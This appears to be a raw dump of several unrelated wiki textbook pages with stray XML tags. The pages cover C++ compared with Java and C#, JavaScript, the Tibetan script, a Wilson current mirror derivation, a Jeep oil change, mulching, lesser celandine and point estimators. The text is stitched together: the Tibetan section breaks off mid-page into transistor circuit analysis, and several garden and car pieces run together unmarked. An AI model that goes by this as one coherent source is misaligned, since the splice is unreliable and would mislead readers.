* C++ is normally compiled directly to [[w:machine code|machine code]] that is then executed directly by the [[w:operating system|operating system]]. Java is normally compiled to [[w:byte-code|byte-code]] that the [[w:Java virtual machine|Java virtual machine]] (JVM) then either [[w:Interpreter (computing)|interprets]] or [[w:Just-in-time compilation|JIT]] compiles to machine code and then executes.
* Due to the lack of constraints in the use of some C++ language features (e.g. unchecked array access, raw pointers), programming errors can lead to low-level [[w:buffer overflow|buffer overflow]]s, [[w:page fault|page fault]]s, and [[w:segmentation fault|segmentation fault]]s. The [[C++ Programming/STL|Standard Template Library]], however, provides higher-level abstractions (like vector, list and map) to help avoid such errors. In Java, such errors either simply cannot occur or are detected by the [[w:Java virtual machine|JVM]] and reported to the application in the form of an [[w:exception handling|exception]].
* In Java, [[w:bounds checking|bounds checking]] is implicitly performed for all array access operations. In C++, array access operations on native arrays are not bounds-checked, and bounds checking for random-access element access on standard library collections like std::vector and std::deque is optional.

===== Miscellaneous ===== 
* Java and C++ use different techniques for splitting up code in multiple source files. Java uses a package system that dictates the file name and path for all program definitions. In Java, the compiler imports the executable [[w:class (file format)|class files]]. C++ uses a [[w:header file|header file]] [[w:source code|source code]] inclusion system for sharing declarations between source files.
* Templates and macros in C++, including those in the standard library, can result in duplication of similar code after compilation. Second, [[w:library (computer science)#Dynamic linking|dynamic linking]] with standard libraries eliminates binding the libraries at compile time.
* C++ compilation features a textual [[C++ Programming/Programming Languages/C++/Code/Compiler/Preprocessor|preprocessing]] phase, while Java does not. Java supports many optimizations that mitigate the need for a preprocessor, but some users add a preprocessing phase to their build process for better support of conditional compilation.
* In Java, arrays are container objects that you can inspect the length of at any time. In both languages, arrays have a fixed size. Further, C++ programmers often refer to an array only by a pointer to its first element, from which they cannot retrieve the array size. However, C++ and Java both provide container classes ('''std::vector''' and '''java.util.ArrayList''' respectively) that are re-sizable and store their size. C++11's '''std::array''' provides fixed-size arrays with a similar efficiency to classic arrays, functions to return the size, and optional bounds-checking.
* Java's division and modulus operators are well defined to truncate to zero. C++ does not specify whether or not these operators truncate to zero or &quot;truncate to -infinity&quot;. -3/2 will always be -1 in Java, but a C++ compiler may {{C++ Programming/kw|return}} either -1 or -2, depending on the platform. [[w:C99|C99]] defines division in the same fashion as Java. Both languages guarantee that &lt;code&gt;(a/b)*b + (a%b) == a&lt;/code&gt; for all a and b (b != 0). The C++ version will sometimes be faster, as it is allowed to pick whichever truncation mode is native to the processor.
* The sizes of integer types is defined in Java (int is 32-bit, long is 64-bit), while in C++ the size of integers and pointers is compiler-dependent. Thus, carefully-written  C++ code can take advantage of the 64-bit processor's capabilities while still functioning properly on 32-bit processors. However, C++ programs written without concern for a processor's word size may fail to function properly with some compilers. In contrast, Java's fixed integer sizes mean that programmers need not concern themselves with varying integer sizes, and programs will run exactly the same. This may incur a performance penalty since Java code cannot run using an arbitrary processor's word size. C++11 offers types such as uint32_t with guaranteed sizes, but compilers are not forced to provide them on hardware which has no native support for the size.

===== Performance ===== 
Computing performance is a measure of resource consumption when a system of hardware and software performs a piece of computing work such as an algorithm or a transaction. Higher performance is defined to be 'using fewer resources'. Resources of interest include memory, bandwidth, persistent storage and CPU cycles. Because of the high availability of all but the latter on modern desktop and server systems, performance is colloquially taken to mean the least CPU cycles; which often converts directly into the least wall clock time. Comparing the performance of two software languages requires a fixed hardware platform and (often relative) measurements of two or more software subsystems. This section compares the relative computing performance of C++ and Java on common operating systems such as Windows and Linux.

Early versions of Java were significantly outperformed by statically compiled languages such as C++. This is because the program statements of these two closely related languages may compile to a small number of machine instructions with C++, while compiling into a larger number of byte codes involving several machine instructions each when interpreted by a Java [[w:JVM|JVM]]. For example:
{| class=&quot;wikitable&quot;
! Java/C++ statement
! C++ generated code
! Java generated byte code
|- 
| vector[i]++;
| mov edx,[ebp+4h]&lt;br/&gt;
mov eax,[ebp+1Ch]&lt;br/&gt;
inc dword ptr [edx+eax*4]
| aload_1&lt;br/&gt;
iload_2&lt;br/&gt;
dup2&lt;br/&gt;
iaload&lt;br/&gt;
iconst_1&lt;br/&gt;
iadd&lt;br/&gt;
iastore
|-
|}

While this may still be the case for [[w:embedded systems|embedded systems]] because of the requirement for a small footprint, advances in [[w:Just-in-time compilation|just in time (JIT)]] compiler technology for long-running server and desktop Java processes has closed the performance gap and in some cases given the performance advantage to Java. In effect, Java byte code is compiled into machine instructions at run time, in a similar manner to C++ static compilation, resulting in similar instruction sequences.

C++ is still faster in most operations than Java at the moment, even at low-level and numeric computation. For in-depth information you could check [http://www.idiom.com/~zilla/Computer/javaCbenchmark.html Performance of Java versus C++]. It's a bit pro-Java but very detailed.

===== Comparing Imports vs Includes =====
There can be some confusion among C and C++ programmers about how imports work, and conversely among Java programmers, for example, about the proper use of include files. In a comparison between Symbol_table '''imports''' in modern Programming_languages with the use of '''#includes''', like in C and C++. Although, both of these techniques are solutions to the same problem, namely compiling across multiple source files, they are vastly different techniques. Since nearly all modern Compilers consist of essentially the same stages of compilation, the biggest difference can be explained by the fact that includes occur in the Lexical_analysis stage of compilation, whereas imports are not done until the semantic analysis stage.

'''Advantages of imports'''&lt;br&gt;
* Imports do not duplicate any lexical analysis effort, which generally results in faster compilation for larger projects.
* Imports do not require splitting code into separate files for declaration/implementation.
* Imports better facilitate distribution of Object_code, rather than Source_code.
* Imports can allow circular dependencies between source files.
* Imports implicitly carry a mechanism for resolving symbol collisions when more than one symbol table defines the same symbol.

'''Disadvantages of imports'''&lt;br&gt;
* When an importable module is altered, since there is no separation of definition and implementation, all dependent modules must be recompiled, which can entail significant compilation times in large projects.
* Imports require a standard mechanism for defining a symbol table in object code. Whether this limitation is truly a weakness is debatable, as a standard symbol table is useful for a number of other reasons.
* Imports require a method for discovering symbol tables at compile time (such as the classpath in Java). When, however, there exists a standard method for doing this, this is not necessarily any more complicated than specifying the locations of include files.
* When circular dependencies are allowed, semantic analysis of several interdependent source files may need to be interleaved.
* Unless the language includes support for Partial_types, languages with imports instead of includes require all source code for a class to be in a single source file.

'''Advantages of includes'''&lt;br&gt;
* With includes, there is no interdependence between source files at the semantic analysis stage. This means that at this stage, each source file can be compiled as an independent unit.
* Separating definition and implementation into header and source files reduce dependencies and allows recompilation of only the affected source file, and no other files, when implementation details are altered.
* Include files, used in combination with other Preprocessor features, allow for nearly arbitrary lexical processing.
* Although the practice is not widespread, includes can provide rudimentary support for several modern language features (such as Mixins and aspects) if the language itself does not support them.
* Includes are not part of the syntax of the underlying language, but rather part of a preprocessor syntax. There are disadvantages to this (another language to learn), but there are also advantages. The preprocessor syntax, and in some cases include files themselves, may be shared among several different languages.

'''Disadvantages of includes'''&lt;br&gt;
* Includes and the requisite preprocessor can require more passes in the lexical analysis stage of compilation.
* Repeated compilation of header files included multiple times in a large project can be notoriously slow. This can be mitigated, however, through the use of Pre-compiled_headers.
* Proper use of header files, particularly declarations of global variables, can be tricky for beginners.
* Because includes generally require the location of the included file to be specified in the source code, environment variables are often needed to provide part of the include file path. Even worse, this functionality is not supported in a standard way across all compilers.

      <text xml:space="preserve">==== C# ====
'''[[Subject:C Sharp programming language|C#]]''' (pronounced &quot;See Sharp&quot;) is a multi-purpose computer [[C++ Programming/Programming Languages|programming language]] catering to all development needs using [[w:.NET Framework|Microsoft .NET Framework]]. 

{{NOTE|C#'s chief designer was Anders Hejlsberg. Before joining Microsoft in 1996, Hejlsberg worked at Borland developing Turbo Pascal and Delphi. At Microsoft he worked as an architect for J++ and is still a key participant in the development of the .NET framework.}} 

We already covered [[C++ Programming/Programming Languages/Comparisons/Java|Java]]. C# is very similar, in that it takes the basic operators and style of C++ but forces programs to be type safe, in that it executes the code in a controlled sandbox called the [[w:virtual machine|virtual machine]]. As such, all code must be encapsulated inside an object, among other things. C# provides many additions to facilitate interaction with [[w:Microsoft|Microsoft]]'s Windows, COM, and Visual Basic. C# is a ECMA and ISO standard.

C# was a response from Microsoft to the (then Sun-developed) Java language that was beginning to have a major impact in the enterprise. After their failed attempt to push J++ into the market and in legal confrontation with Sun, Microsoft shifted their focus to managed languages, even as a way to maintain the relevance of Virtual Basic with a large developer base, and so with the announcement of Windows &quot;Longhorn&quot; project (which became Windows Vista) the push to managed languages and its integration with the Windows Operating System began, with the belief that from there on &quot;all new Windows APIs would be managed&quot;.

Today however, Microsoft seems to have finally realized that managed languages, even looking on the adoption of Java, lack the requirements to develop an Operating System. Microsoft even started a C#-based OS to test the premise, but came to a realization that all major software projects, even utilities that come with the Windows OS, are mostly C or C++ based. Even if managed code still has a place, C and C++ have finally been accepted as the core languages of the software industry for the foreseeable future. In Windows, this is being seen as the &quot;C++ Renaissance&quot; after the long age of darkness that the marketing machine had engulfed developers with. 

;Issues C# vs C++
* Limitation: With C#, features like multiple inheritance from classes (C# implements a different approach called Multiple Implementation, where a class can implement more than one interface), declaring objects on the stack, deterministic destruction (allowing RAII) and allowing default arguments as function parameters (in C# versions &lt; 4.0) will not be available. 
* Performance (speed and size): Applications built in C# may not perform as well when compared with native C++. C# has an intrusive garbage collector, reference tracking and other overheads with some of the framework services. The .NET framework alone has a big runtime footprint (~30 Mb of memory), and requires that several versions of the framework be installed.
* Flexibility: Due to the dependency on the .NET framework, operating system level functionality (system level APIs) is buffered by a generic set of functions that will reduce some freedoms.
* Runtime Redistribution: Programs need to be distributed with the .NET framework (pre-Windows XP or non-Windows machines), similar to the issue with the Java language, with all the normal upgrade requirements attached.
* Portability: The .NET complete framework is only available on the Windows OS, but there are open-source versions that provide most of the core functionality, that also support the GNU-Linux OS, like  MONO and Portable.NET [http://getdotgnu.com/pnet http://getdotgnu.com/pnet]. There are ECMA and ISO .NET standards for example for C# and the CLI extension to C++.

There are several shortcomings to C++ that are resolved in C#. One of the more subtle ones is the use of reference variables as function arguments. When a code maintainer is looking at C++ source code, if a called function is declared in a header somewhere, the immediate code does not provide any indication that an argument to a function is passed as a non-const reference. An argument passed by reference could be changed after calling the function whereas an argument passed by value or passed as const cannot be changed. A maintainer unfamiliar with the function and looking for the location of an unexpected value change of a variable would additionally need to examine the header file for the function in order to determine whether or not that function could have changed the value of the variable. C# insists that the '''ref''' keyword be placed in the function call (in addition to the function declaration), thereby cluing the maintainer in that the value could be changed by the function.

An example comparing [[C++_Programming/Code/IO#.E2.80.8ERounding_number_example|C++]] with C# can be found [[C_Sharp_Programming/The_.NET_Framework/Console_Programming#Rounding_number_example|here]].

      <comment>Undid revision 2306100: Huh? What does a lawsuit over Java have to do with the JavaScript?</comment>
      <text xml:space="preserve">==What is Scripting Language?==

Scripting languages (commonly called scripting programming languages or script languages) are computer programming languages that are typically interpreted and can be typed directly from a keyboard. Thus, scripts are often distinguished from programs, because programs are converted permanently into binary executable files (i.e., zeros and ones) before they are run. Scripts remain in their original form and are interpreted command-by-command each time they are run. Scripts were created to shorten the traditional edit-compile-link-run process. The name 'script' is derived from the written script of the performing arts, in which dialogue is set down to be interpreted by actors and actresses--the programs. Early script languages were often called batch languages or job control languages. Scripting languages can also be compiled, but because interpreters are simpler to write than compilers, they are interpreted more often than they are compiled.

==What is JavaScript?==
Java script is a compact object-based scripting language for developing client and server Internet applications. Netscape Navigator interprets JavaScript statements embedded in an HTML page, and LiveWire enables you to create server-based applications similar to Common Gateway Interface (CGI) programs.
Basically JavaScript is a program that assists interactivity with HTML pages. For example: Black Board quizes for College students. JavaScript support is built right into all the major web browsers, including Internet Explorer, Google Chrome, Firefox and Safari. Provided that the visitors to your site are using web browsers that support JavaScript (most do) and have JavaScript enabled (it is by default), then your JavaScript will run when they visit the page. There are plenty of pre-written JavaScripts that people have made available for you to plug straight into your web page. All you need to know to be able to use such scripts is how to paste the supplied code into the required places in your web page.

==What can a JavaScript Do?==
* JavaScript gives HTML designers a programming tool - HTML authors are normally not programmers, but JavaScript is a      scripting language with a very simple syntax! Almost anyone can put small &quot;snippets&quot; of code into their HTML pages
* JavaScript can put dynamic text into an HTML page - A JavaScript can write a variable text into an HTML page
* JavaScript can react to events - A JavaScript can be set to execute when something happens, like when a page has finished loading or when a user clicks on an HTML element
* JavaScript can read and write HTML elements - A JavaScript can read and change the content of an HTML element
* JavaScript can be used to validate data - A JavaScript can be used to validate form data before it is submitted to a server. This saves the server from extra processing
* JavaScript can be used to detect the visitor's browser - A JavaScript can be used to detect the visitor's browser, and - depending on the browser - load another page specifically designed for that browser
* JavaScript can be used to create cookies - A JavaScript can be used to store and retrieve information on the visitor's computer

To better handle Web page interactivity, a new set of Web standards-called AJAX (Asynchronous JavaScript and XML) has been developed. AJAX is used on many Web sites. AJAX is used on Google Maps, Gmail &amp; many other Web applications. It creates a faster and more efficient interactive Web applications. For AJAX to be faster than just JavaScript when you reload a Web page, AJAX applications request only new data and add the data to the existing Web page. By doing this, when it’s refreshed less content needs to be downloaded each time the Web page changes. This is how AJAX saves time.

      <text xml:space="preserve">When learning a new language, it's always a good idea to begin by knowing how to read and write. The Tibetan script has 30 consonants. The vowels are a, i, u, e, o. As in other Indic scripts, each consonant letter includes an inherent a, and the other vowels are indicated by marks; thus  ཀ ka, ཀི ki, ཀུ ku, ཀེ ke, ཀོ ko. There is no distinction between long and short vowels in written Tibetan, except in loanwords, especially transcribed from the Sanskrit. 

Syllables are separated by a tseg ་; since many Tibetan words are monosyllabic, this mark often functions almost as a space. Spaces are not used to divide words.

Although some Tibetan dialects are tonal, because the language had no tone at the time of the scripts invention, tones are not written. However, since tones developed from segmental features they can usually be correctly predicted by the spelling of Tibetan words.

The ''h'' or apostrophe (’) usually signifies aspiration, but in the case of zh and sh it signifies palatalization and the single letter h represents a voiceless glottal fricative.

Old Tibetan had no letter w, which was instead a digraph for 'w. 

The Sanskrit &quot;cerebral&quot; (retroflex) consonants are represented by mirror forms of the letters ta, tha, da, na, and sha  to give ཊ {{Unicode|ṭa}} (Ta), ཋ {{Unicode|ṭha}} (Tha), ཌ {{Unicode|ḍa}} (Da), ཎ {{Unicode|ṇa}} (Na), and ཥ {{Unicode|ṣa}} (Sa).

As in other Indic scripts, clustered consonants are often stacked vertically. Unfortunately, some fonts and applications do not support this behavior for Tibetan, so these examples may not display properly; you might have to download a font such as [http://www.thdl.org/tools/fonts/tibfonts.php?l=uva10928423419921 Tibetan Machine Uni].

W, r, and y change form when they are beneath another consonant; thus ཀྭ kwa; ཀྲ kra; ཀྱ kya. R also changes form when it is above most other consonants; thus རྐ rka. An exception is the cluster རྙ rnya.

[[image:Basic BJT Current Mirror.svg|center]]
[[Image:Multiple BJT Current Mirror.svg|center]]

==The Wilson Current Mirror==
[[Image:Wilson Current Mirror_(Currents_Labelled).svg|right]]
The Wilson current mirror, named after engineer George Wilson, who invented the arrangement, is widely regarded as an ingenious and elegant solution to the finite-&amp;beta; error of the simple BJT current mirror.

In order for it to function correctly, the following conditions need to be met:
#Q1 and Q2 are be matched, so their collector currents are equal for the same base current
#All three transistors have the same common-emitter current gain, &amp;beta;

As Q1 and Q2 have the same emitter voltages (ground) and the same base voltages (as they are connected), the base currents are the same. We will term this current ''I&lt;sub&gt;B&lt;/sub&gt;'':
{{eqn|W1}}
::&lt;math&gt;I_{B1}=I_{B2}=I_B \,&lt;/math&gt;

From Condition 1 above, we can say that the collector currents in Q1 and Q2 are identical (''I&lt;sub&gt;C&lt;/sub&gt;''):
{{eqn|W2}}
::&lt;math&gt;I_{C1}=I_{C2}=I_C \,&lt;/math&gt;

Now, from the basic BJT equations, we know that the base current of Q3 is given by:
{{eqn|W3}}
::&lt;math&gt;I_{B3}=\frac{I_{O}} {\beta} &lt;/math&gt;

Similarly, the emitter current is also known:
{{eqn|W4}}
::&lt;math&gt;I_{E3}=\frac{\beta+1} {\beta}I_{O} &lt;/math&gt;

It is obvious from the diagram and KCL, that the following is true:
{{eqn|W5}}
::&lt;math&gt;I_{E3}=I_{C2}+I_{B1}+I_{B2}\,&lt;/math&gt;

Substituting from equations W1 and W2, we get
{{eqn|W6}}
::&lt;math&gt;I_{E3}=I_{C}+2I_{B}\,&lt;/math&gt;

Given that ''I&lt;sub&gt;C&lt;/sub&gt;''=''&amp;beta;I&lt;sub&gt;B&lt;/sub&gt;'' (Condition 2 and basic BJT equations), we have that
{{eqn|W7}}
::&lt;math&gt;I_{E3}=I_{C}+2\frac{I_{C}}{\beta}=I_{C} \left( 1 + \frac{2}{\beta} \right)=I_{C} \left(  \frac{2+\beta}{\beta} \right)&lt;/math&gt;

Substituting for ''I&lt;sub&gt;E3&lt;/sub&gt;'' from equation W4,
{{eqn|W8}}
::&lt;math&gt;I_{O} \left( \frac{\beta+1} {\beta} \right)=I_{C} \left(  \frac{2+\beta}{\beta} \right)&lt;/math&gt;

Rearranging to make ''I&lt;sub&gt;C&lt;/sub&gt;'' the subject, we have
{{eqn|W9}}
::&lt;math&gt;I_C=I_{O} \left( \frac{\beta+1}{\beta+2} \right)&lt;/math&gt;

Now, let's consider the reference current, ''I&lt;sub&gt;REF&lt;/sub&gt;''. By KCL, and then substituting from W2,
{{eqn|W9}}
::&lt;math&gt;I_{REF}=I_{C1} + I_{B3} =I_{C} + I_{B3} \,&lt;/math&gt;

From W3 and W9, we now have:
{{eqn|W10}}
::&lt;math&gt;I_{REF}=I_{O} \left( \frac{\beta+1}{\beta+2} \right) + \frac{I_{O}} {\beta}= I_{O} \left( \frac{\beta+1}{\beta+2} +\frac{1}{\beta} \right)\,&lt;/math&gt;

Rearranging,
{{eqn|W11}}
::&lt;math&gt;I_O=\frac{I_{REF}}{ \left( \frac{\beta+1}{\beta+2} +\frac{1}{\beta} \right)}&lt;/math&gt;

Finally, simplifying by simple fractional addition and factorisation, we have:
{{eqn|W12}}
::&lt;math&gt;I_O=\frac{I_{REF}}{1+ \frac{2}{\beta\left(\beta+2\right)}}&lt;/math&gt;

It is clear that if &amp;beta; is large, then &amp;beta;(&amp;beta;+2) is large, the denominator in the above expression approaches unity, and the output current, ''I&lt;sub&gt;O&lt;/sub&gt;'' approaches the reference current ''I&lt;sub&gt;REF&lt;/sub&gt;'':
{{eqn|W13}}
::&lt;math&gt;\lim \limits_{\beta  \to \infty } \left( {I_O } \right) = I_{REF}&lt;/math&gt;

However, due to the quadratic term, a very good approximation is achieved for much lower values of &amp;beta; than the simple current mirror. For example, transistors with a very modest &amp;beta; of 50 can theoretically expect a current deviation of about 0.75 &amp;mu;A. For a &amp;beta; of 150, this drops to 87 nA.

It should be noted that the Wilson Current Mirror is ''not'' a constant-current source. If the supply voltage, ''V&lt;sub&gt;CC&lt;/sub&gt;'' changes, the output current will change. Suppose that the reference current, ''I&lt;sub&gt;REF&lt;/sub&gt;'', is supplied by a resistor to the supply voltage. Suppose the ''v&lt;sub&gt;BE&lt;/sub&gt;'' of all the transistors is 0.7 V. Now, the voltage at the bases of Q1 and Q2 is therefore 0.7 V, as the emitters are at ground. The base of Q3 is therefore at (0.7+0.7)=1.4 V. This means that the reference current is given by:
{{eqn|W14}}
::&lt;math&gt;I_{REF}=\frac{V_{CC}-1.4}{R_{REF}}&lt;/math&gt;

Thus, the output current will also be dependant on the supply voltage. A constant current source as the reference curent will ensure a constant output current.

===Output Resistance===
[[Image:Wilson Current Mirror Output Resistance.svg|right]]
Lets consider the small-signal model on the right. The transitors have been replaced by the small-signal T-model, which has then been drawn as a large-signal BJT, with the small-signal output resistances, ''r&lt;sub&gt;o&lt;/sub&gt;'' in parallel. More on this can be found [[Analogue_Electronics/BJTs/T-model|here]]. The output resistors in Q1 and Q2 are present in this model, but they are greyed out as they do not play a part in the analysis. The reference current is deactivated in the small signal model, meaning that the base of Q3 is simply connected to the collector of Q1.

We will find the output resistance of the current mirror, ''R&lt;sub&gt;o&lt;/sub&gt;'' by applying a voltage, ''v&lt;sub&gt;x&lt;/sub&gt;'' to the output and finding the relationship between this and the current that flows in the output, ''i&lt;sub&gt;x&lt;/sub&gt;''. Firstly, notice that the base current flows ''out'' of the base of Q3, and that the collector and emitter currents in Q3 are therefore reversed (these are in the large-signal BJT only and are NOT the same as ''i&lt;sub&gt;C3&lt;/sub&gt;'' and ''i&lt;sub&gt;E3&lt;/sub&gt;'', although ''i&lt;sub&gt;B3&lt;/sub&gt;'' is the same in both). This is just to remove negatives from the analysis. If they are not reversed, the analysis will still give the same result.

Firstly, recall that Q1 and Q2 are matched, so the collector currents are the same, as are the base currents. Let us call the collector currents in these simply ''i''. Also the collector current of Q1 is equal to the (outward) base current of Q3. This leads to the following expressions:

::&lt;math&gt;i_{C1}=i_{C2}=i_{B3}=i \,&lt;/math&gt;

From the common-emitter equations, we also know the base currents:

::&lt;math&gt;i_{B1}=i_{B2}=\frac{i}{\beta}&lt;/math&gt;

From the common-emitter equations, we can also state the current in the collector and emitter of the large signal BJT in Q3. These are shown on the diagram. From KCL, we can also show that at the collector-base connection of Q2,

::&lt;math&gt;i_{E3}=i_{B1}+i_{B2}+i_{C2}=\frac{2i}{\beta}+i&lt;/math&gt;
::&lt;math&gt;i_{E3}=i \left(1+\frac{2}{\beta} \right)&lt;/math&gt;

The base-emitter voltage of Q1 or Q2, ''v&lt;sub&gt;be1&lt;/sub&gt;'' is given by the (large signal) current in the emitter multiplied by the large-signal base-emitter resistor, which is usually denoted ''r&lt;sub&gt;e&lt;/sub&gt;'' in the T-model:

::&lt;math&gt;v_{be1}=\left( \beta + 1 \right)\frac{i}{\beta} r_e=i\left( \frac{\beta + 1}{\beta} \right)r_e&lt;/math&gt;

KCL at the Q3 large-signal collector/output resistor junction (paying close attention to the directions of the currents) shows that the current in the output resistor of Q3, ''i&lt;sub&gt;ro3&lt;/sub&gt;'' is given by:

::&lt;math&gt;i_{ro3}=i \left(1+\frac{2}{\beta} \right)+i \left(\beta +1 \right)&lt;/math&gt;
::&lt;math&gt;i_{ro3}=i \left(\beta + 2 +\frac{2}{\beta}\right)&lt;/math&gt;

By Ohm's Law, we can now work out the voltage across the output resistor:

::&lt;math&gt;v_{ro3}=i \left(\beta + 2 +\frac{2}{\beta}\right)r_{o}&lt;/math&gt;

Therefore, the voltage ''v&lt;sub&gt;x&lt;/sub&gt;'', is given by the sum of this voltage and the base-emitter voltage of Q1 or Q2:

::&lt;math&gt;v_x=i\left( \frac{\beta + 1}{\beta} \right)r_e+i \left(\beta + 2 +\frac{2}{\beta}\right)r_{o}&lt;/math&gt;

The current ''i&lt;sub&gt;x&lt;/sub&gt;'' can be found using KCL at the top of the output resistor of Q3:

::&lt;math&gt;i_x=i_{ro3}-\beta i=i \left( 2 + \frac{2}{\beta}\right)&lt;/math&gt;

The output resistance, ''R&lt;sub&gt;o&lt;/sub&gt;'' is defined as follows:

::&lt;math&gt;R_o=\frac{v_x}{i_x}&lt;/math&gt;

Which, after cancelling the factors of ''i'', leads to the somewhat untidy equation:

::&lt;math&gt;R_o=\frac{\left( \frac{\beta + 1}{\beta} \right)r_e+ \left(\beta + 2 +\frac{2}{\beta}\right)r_{o}}{2 + \frac{2}{\beta}}&lt;/math&gt;

Now, ''r&lt;sub&gt;e&lt;/sub&gt;'' is given by the equation &lt;math&gt;r_e=\frac{\beta}{\beta+1}\frac{1}{g_m}&lt;/math&gt;. See the T-model pages for more detail on this. Notice that the two fraction involving &amp;beta; cancel out, leaving just &lt;math&gt;\frac{1}{g_m}&lt;/math&gt;. Since ''g&lt;sub&gt;m&lt;/sub&gt;'' is usually on the order of 20mS, this term is about 50Ω. Considering that this is going to be added to a term involving &amp;beta;'s (in the region of 100) multiplied by ''r&lt;sub&gt;o&lt;/sub&gt;'' (on the order of 50kΩ), this term is insignificant. We can now write, to a very good approximation,

::&lt;math&gt;R_o\approx\frac{ \left(\beta + 2 +\frac{2}{\beta}\right)r_{o}}{2 + \frac{2}{\beta}}&lt;/math&gt;

Let's multiply top and bottom by &amp;beta; to emphasise the next point:

::&lt;math&gt;R_o \approx\frac{ \left(\beta^2 + 2\beta +2\right)r_{o}}{2\beta + 2}&lt;/math&gt;

Now, we can say that both the &quot;2&quot; terms are insignificant compared to terms involving &amp;beta; when &amp;beta; is large. We can also say that the 2&amp;beta; term on the top of the fraction is insignificant compared to &amp;beta;&lt;sup&gt;2&lt;/sup&gt;. We will see in moment, that although this may seem like a gross approximation, it is in fact more than accurate enough for practical purposes. Removing these terms and dividing by &amp;beta; top and bottom, our equation is now simply

::&lt;math&gt;R_o \approx\frac{ \beta r_{o}}{2}&lt;/math&gt;

For a &amp;beta; of 100, an ''r&lt;sub&gt;o&lt;/sub&gt;'' of 50kΩ and an ''r&lt;sub&gt;e&lt;/sub&gt;'' of 50Ω, the value calculated using the full equation is 2.53MΩ, while the approximation gives 2.5MΩ. So, we can see that the approximation is well worth the massive simplification in the equation, especially as the practical value will very likely vary by more than this discrepancy anyway. This also shows the enormous output impedance of a Wilson current mirror, even for modest values of &amp;beta;.

      <comment>Note re SL oil requirement</comment>
      <text xml:space="preserve">Run the engine first to heat the oil.  Doing so makes it run more freely.

Use a 9/16 wrench to remove the oil drain cap from the Jeep's sump. Be careful as the oil will be hot from running the engine. Do not get any used engine oil onto hands or skin. It is highly carcinogenic. Allow the oil to fully drip out, collecting it in a suitable oil pan or container.

Once all the oil has drained out, remove the oil filter. It is positioned right below the oil dip stick. When installing a new oil filter, put some new engine oil on and around the rubber seal. Replace oil drain cap.

Fill the engine back up with 6 U.S. quarts of SAE 10w30 motor oil. In colder climates, 5w30 may be used.  Be careful not to overfill by checking the level on the dipstick. Once the correct level is reached, replace the oil filler cap and run the engine for about 30 seconds to let the oil circulate around the engine and into the new filter. Check the level now and top up if necessary.

API SL or ACEA A3 rated oil should be used. API SM and SN oil does not provide the wear protection required by the flat tappets in the AMC 242 engine.

'''Mulching''' is a common practice in garden maintenance involving the covering of exposed soil with a loose material to provide weed control, moisture retention, and temperaturre regulation. Most often the mulch material is also organic matter which also helps raise the nutrient content of the soil, but in some cases stone or even synthetic mulches are used to provide longer-term cover. Organic mater is sometimes also raked over lawns, which is referred to as &quot;top-dressing&quot;. In some situations, mulches are also added on top of a soil barrier, in order to smother weeds or stabilize soil.

Mulches can be applied at any time of year. In most gardens, it is only applied once in the springtime as part of the [[../Spring Cleanup|spring cleanup]] process, but in intensive veetable gardens and many organic gardens, it is applied more than once. Whenever they are applied, it is always ''after'' a garden has been well-weeded and edged.

When applying mulch, it's best to start applying at the back of the garden, or in the middle in the case of &quot;island&quot; beds, in order to avoid walking on or rolling wheelbarrows over the mulch that's already been applied.

In gardens with large open spaces between plants, the simplest method is to simply dump the wheelbarrows or bags on the soil, then spread with a rake. In densely planted gardens, it is best to mulch by hand. 

The depth of the mulch depends on the type of mulch used: for wood mulches (the most common type in most areas due to price and availability), the mulch is generally laid 1.5&quot; to 2&quot; thick. 

Mulches should never be thrown on top of plant crowns, as this creates conditions conducive to rots. The mulch should be kept about 2&quot; from any plant crown or tree trunk (it should ''never'' be piled up in &quot;volcanoes&quot; against the trunk of a tree).

'''Lesser celandine''', (''Ranunculus ficaria'', syns. ''Ficaria grandiflora'', ''Ficaria verna''), is a low-growing perennial native to Eurasia, but introduced into other parts of the world where it has escaped from cultivation.

==Description==
Lesser Celandine is a low-growing, hairless perennial plant, with fleshy dark green, heart-shaped leaves. It is a spring ephemeral, meaning that the foliage dies down after seeds are set in early summer.

The flowers are yellow, turning white as they age. Ranunculus ficaria exists in both diploid and tetraploid forms which are very similar in appearance. However, the tetraploid type prefer more shady locations and frequently develops bulbils at the base of the stalk. These two variants are sometimes referred to as distinct sub-species, ''R. ficaria ficaria'' and ''R. ficaria bulbifer'' respectively. The plant is found throughout Europe and west Asia and is now introduced in North America. It prefers bare, damp ground and in the UK it is often a persistent garden weed.

==Ecology==
In many parts of the northern United States and Canada, lesser celandine is an invasive weed.&lt;ref&gt;{{cite web | url=http://www.nps.gov/plants/alien/pubs/midatlantic/rafi.htm | title=Lesser Celandine | work=Plant Invaders of Mid-Atlantic Natural Areas | author=Swearingen, J., K. Reshetiloff, B. Slattery, and S. Zwicker | year=2002 |publisher=National Park Service and U.S. Fish &amp; Wildlife Service, Washington, D.C.}}&lt;/ref&gt; It can be a difficult weed to eradicate both in gardens and in woodlands or meadows.

==Uses==
According to Gilbert White, a diarist writing around 1800 in the Hampshire village of Selborne, the plants came out on February 21st, but it is more commonly reported to flower from March until May, and is sometimes called the &quot;spring messenger&quot; as a consequence. It is sometimes planted (or at least tolerated) for the early flowers and the glossy foliage.

The plant used to be known as Pilewort, as it was used to treat hemorrhoids. Supposedly the knobbly tubers of the plant resemble piles, and according to the Doctrine of signatures this resemblance suggests that pilewort could be used to cure piles. The German vernacular Scharbockskraut (Scurvywort) derives from the use of the early leaves, which are high in vitamin C, against scurvy.

      <text xml:space="preserve">=Point Estimates=
'''Definition:''' Suppose a random variable &lt;math&gt;X\,&lt;/math&gt; follows a statistical distribution or a law &lt;math&gt;\mathcal{L}_\theta&lt;/math&gt; indexed by parameter &lt;math&gt;\theta\,&lt;/math&gt;. Then a function &lt;math&gt;g:X\rightarrow\hat{\theta}&lt;/math&gt; from the ''sample space'' to the ''parameter space'' is called a '''point estimator''' of &lt;math&gt;\theta\,&lt;/math&gt;.

In general, let &lt;math&gt;f(\theta)\,&lt;/math&gt; be any function of &lt;math&gt;\theta\,&lt;/math&gt;. Then any function from the ''sample space'' to the domain of &lt;math&gt;f\,&lt;/math&gt; will be called a '''point estimator''' of &lt;math&gt;f(\theta)\,&lt;/math&gt;.

'''Definition:''' If &lt;math&gt;h\,&lt;/math&gt; is a point estimator for &lt;math&gt;\theta\,&lt;/math&gt;, then for a realization &lt;math&gt;x\,&lt;/math&gt; of the random variable &lt;math&gt;X\,&lt;/math&gt;, the quantity &lt;math&gt;h(x)\,&lt;/math&gt; is called a '''point estimate''' of &lt;math&gt;\theta\,&lt;/math&gt; and is denoted as &lt;math&gt;\hat\theta\,&lt;/math&gt;.

